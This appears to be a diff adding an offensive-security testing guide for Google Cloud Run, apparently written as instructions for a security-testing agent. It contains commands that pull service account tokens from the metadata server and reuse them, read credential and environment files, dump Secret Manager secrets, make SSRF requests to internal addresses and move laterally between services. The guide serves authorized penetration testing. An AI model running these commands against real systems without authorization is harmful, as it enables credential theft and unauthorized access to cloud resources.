@@ -1,0 +1,428 @@
+<gcp_cloud_run_security_guide>
+<title>GCP CLOUD RUN SECURITY TESTING</title>
+
+<critical>Cloud Run is Google's fully managed serverless container platform. Security vulnerabilities arise from container escape attempts, IAM binding misconfigurations, service account impersonation, ingress/egress settings, and revision access control. Testing must cover both container and platform security.</critical>
+
+<scope>
+- Container escape attempts
+- IAM binding issues
+- Service account impersonation
+- Ingress/egress misconfigurations
+- Revision access control
+- Secret management
+- VPC connector security
+</scope>
+
+<methodology>
+1. Identify Cloud Run services and configurations.
+2. Test container security boundaries.
+3. Probe IAM bindings and permissions.
+4. Analyze service account permissions.
+5. Check ingress and egress settings.
+6. Test revision and traffic management.
+</methodology>
+
+<container_security>
+<container_escape>
+{% raw %}
+# Container escape testing:
+
+# 1. Metadata service access:
+# Cloud Run uses v1 metadata server
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/
+
+# 2. Instance metadata:
+# Project info:
+/computeMetadata/v1/project/project-id
+/computeMetadata/v1/project/numeric-project-id
+
+# Service account token:
+/computeMetadata/v1/instance/service-accounts/default/token
+/computeMetadata/v1/instance/service-accounts/default/identity
+
+# 3. Container filesystem:
+# Check for sensitive files
+cat /proc/self/environ
+cat /etc/passwd
+ls -la /var/run/secrets/
+
+# 4. Kubernetes secrets:
+# If running on GKE:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# 5. Process isolation:
+# Check if other processes visible
+ls /proc/
+cat /proc/1/cmdline
+{% endraw %}
+</container_escape>
+
+<container_vulnerabilities>
+{% raw %}
+# Container vulnerability testing:
+
+# 1. File permissions:
+# World-readable sensitive files
+find / -perm -o+r -type f 2>/dev/null
+
+# 2. SUID binaries:
+find / -perm -u+s -type f 2>/dev/null
+
+# 3. Capabilities:
+cat /proc/self/status | grep Cap
+capsh --print
+
+# 4. Seccomp profile:
+cat /proc/self/status | grep Seccomp
+
+# 5. AppArmor/SELinux:
+cat /proc/self/attr/current
+
+# 6. Network access:
+# Test internal network access
+curl http://10.0.0.1/
+curl http://internal-service/
+{% endraw %}
+</container_vulnerabilities>
+</container_security>
+
+<iam_issues>
+<iam_binding_attacks>
+{% raw %}
+# IAM binding vulnerabilities:
+
+# 1. allUsers access:
+# Service allows unauthenticated access
+gcloud run services get-iam-policy SERVICE
+
+# Check for:
+bindings:
+- members:
+  - allUsers  # Public access!
+  role: roles/run.invoker
+
+# 2. allAuthenticatedUsers:
+# Any Google account can access
+- members:
+  - allAuthenticatedUsers
+  role: roles/run.invoker
+
+# 3. Over-privileged bindings:
+# roles/owner or roles/editor on service
+# roles/run.admin for all users
+
+# 4. Domain-wide access:
+# Entire domain has access
+- members:
+  - domain:example.com
+  role: roles/run.invoker
+
+# 5. Inheritance from project:
+# Project-level IAM may grant access
+gcloud projects get-iam-policy PROJECT
+{% endraw %}
+</iam_binding_attacks>
+
+<invoker_bypass>
+{% raw %}
+# Invoker authentication bypass:
+
+# 1. No authentication required:
+# Check if service is public
+curl https://service-xxxxx-uc.a.run.app
+
+# 2. Identity token validation:
+# If auth required, test token handling
+curl -H "Authorization: Bearer $TOKEN" https://service-url
+
+# 3. Audience validation:
+# Token should have correct audience
+# Test with token for different service
+
+# 4. Issuer validation:
+# Token must be from Google
+# Test with self-signed JWT
+
+# 5. Service-to-service auth:
+# Test invoking from other services
+# Check if proper auth is enforced
+{% endraw %}
+</invoker_bypass>
+</iam_issues>
+
+<service_account>
+<sa_impersonation>
+{% raw %}
+# Service account impersonation:
+
+# 1. Get current service account:
+curl -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+
+# 2. Get access token:
+curl -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+# 3. Token scopes:
+curl -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
+
+# 4. Use token for API calls:
+export TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata/computeMetadata/v1/instance/service-accounts/default/token" \
+  | jq -r .access_token)
+
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://storage.googleapis.com/storage/v1/b/BUCKET/o"
+
+# 5. Identity token for service-to-service:
+curl -H "Metadata-Flavor: Google" \
+  "http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target-service"
+{% endraw %}
+</sa_impersonation>
+
+<sa_permissions>
+{% raw %}
+# Service account permission testing:
+
+# 1. Test common APIs:
+# Cloud Storage:
+gsutil ls gs://
+gsutil cp gs://bucket/file ./
+
+# BigQuery:
+bq ls
+
+# Secret Manager:
+gcloud secrets list
+gcloud secrets versions access latest --secret=SECRET
+
+# 2. Project-level access:
+gcloud projects list
+gcloud services list
+
+# 3. Compute Engine access:
+gcloud compute instances list
+gcloud compute ssh INSTANCE
+
+# 4. Cloud Functions:
+gcloud functions list
+gcloud functions call FUNCTION
+
+# 5. Other Cloud Run services:
+gcloud run services list
+curl -H "Authorization: Bearer $TOKEN" https://other-service/
+{% endraw %}
+</sa_permissions>
+</service_account>
+
+<ingress_egress>
+<ingress_configuration>
+{% raw %}
+# Ingress configuration testing:
+
+# 1. Ingress settings:
+# all - public internet
+# internal - only from VPC
+# internal-and-cloud-load-balancing
+
+gcloud run services describe SERVICE --format="value(spec.traffic)"
+
+# 2. Internal bypass:
+# If ingress is internal:
+# Test from VPC
+# Test from Cloud Functions
+# Test from other Cloud Run
+
+# 3. Load balancer bypass:
+# Direct service URL vs LB URL
+https://service-xxxxx-uc.a.run.app  # Direct
+https://example.com/api  # Via LB
+
+# 4. Custom domains:
+# Domain mapping may have different access
+# Check all entry points
+
+# 5. VPC connector:
+# Traffic routed through VPC
+# May have different security
+{% endraw %}
+</ingress_configuration>
+
+<egress_testing>
+{% raw %}
+# Egress configuration testing:
+
+# 1. Outbound internet access:
+curl https://external-service.com
+curl http://metadata.google.internal  # Always works
+
+# 2. VPC egress:
+# If configured for VPC egress:
+# All traffic through VPC
+# Internal DNS resolution
+
+# 3. Private Google Access:
+# Access Google APIs privately
+curl https://storage.googleapis.com
+
+# 4. Serverless VPC connector:
+# Test internal IP access
+curl http://10.0.0.1/internal-service
+
+# 5. SSRF via egress:
+# If user controls URL:
+curl "http://169.254.169.254/computeMetadata/v1/"
+curl "http://internal.corp/admin"
+{% endraw %}
+</egress_testing>
+</ingress_egress>
+
+<revision_security>
+<revision_access>
+{% raw %}
+# Revision and traffic testing:
+
+# 1. List revisions:
+gcloud run revisions list
+
+# 2. Access specific revision:
+# Each revision has a URL
+curl https://service-xxxxx-abc-uc.a.run.app
+
+# 3. Traffic splitting:
+# Old revisions may be accessible
+# Check traffic allocation
+gcloud run services describe SERVICE
+
+# 4. Revision differences:
+# Older revisions may have:
+# - Different code (vulnerabilities)
+# - Different environment variables
+# - Different service account
+
+# 5. Rollback attacks:
+# Force traffic to vulnerable revision
+# If can modify traffic
+{% endraw %}
+</revision_access>
+
+<deployment_issues>
+{% raw %}
+# Deployment security:
+
+# 1. Image vulnerabilities:
+# Container image may have CVEs
+gcloud artifacts docker images list
+
+# 2. Environment variables:
+# Secrets in env vars
+gcloud run services describe SERVICE --format=yaml
+
+# 3. Cloud Build:
+# Build process exposure
+# Build logs may contain secrets
+
+# 4. Artifact Registry:
+# Image pull permissions
+# Public images
+
+# 5. Container startup:
+# Slow startup = cold start attacks
+# Timeout exploitation
+{% endraw %}
+</deployment_issues>
+</revision_security>
+
+<secrets_management>
+<secret_exposure>
+{% raw %}
+# Secret management testing:
+
+# 1. Environment variables:
+# Secrets may be in env vars
+printenv | grep -i secret
+printenv | grep -i key
+printenv | grep -i password
+
+# 2. Secret Manager integration:
+# Mounted as volume or env
+ls /secrets/
+cat /secrets/api-key
+
+# 3. Secret access via API:
+# If service account has access:
+gcloud secrets versions access latest --secret=SECRET
+
+# 4. Secret enumeration:
+gcloud secrets list
+# May reveal secret names
+
+# 5. Secret history:
+gcloud secrets versions list SECRET
+# Access older versions
+{% endraw %}
+</secret_exposure>
+</secrets_management>
+
+<common_payloads>
+{% raw %}
+# Metadata access:
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+
+# Access token:
+curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/service-accounts/default/token
+
+# Identity token:
+curl -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target"
+
+# Secret access:
+gcloud secrets versions access latest --secret=SECRET
+
+# IAM check:
+gcloud run services get-iam-policy SERVICE
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate service account token extraction.
+2. Show IAM misconfiguration allowing access.
+3. Prove secret or configuration exposure.
+4. Document ingress/egress bypass.
+5. Provide container security issue evidence.
+</validation>
+
+<false_positives>
+- Properly restricted IAM bindings
+- Service account with minimal permissions
+- Ingress limited to internal
+- Secrets properly managed
+- Container with security hardening
+- VPC connector with proper configuration
+</false_positives>
+
+<impact>
+- Unauthorized service invocation
+- Cloud resource access via service account
+- Data breach via secret exposure
+- Internal network access via SSRF
+- Lateral movement to other services
+- Privilege escalation via IAM
+</impact>
+
+<pro_tips>
+1. Always test metadata service access.
+2. Check service account permissions.
+3. Verify IAM bindings for allUsers.
+4. Test all revisions for vulnerabilities.
+5. Check environment variables for secrets.
+6. Test ingress from different sources.
+7. Verify egress restrictions.
+8. Look for Secret Manager access.
+9. Check VPC connector configuration.
+10. Document project and service details.
+</pro_tips>
+
+<remember>Cloud Run security depends on proper IAM configuration, service account permissions, and container security. The metadata service provides access to service account tokens that can be used to access other GCP resources. Always test the full scope of service account permissions.</remember>
+</gcp_cloud_run_security_guide>
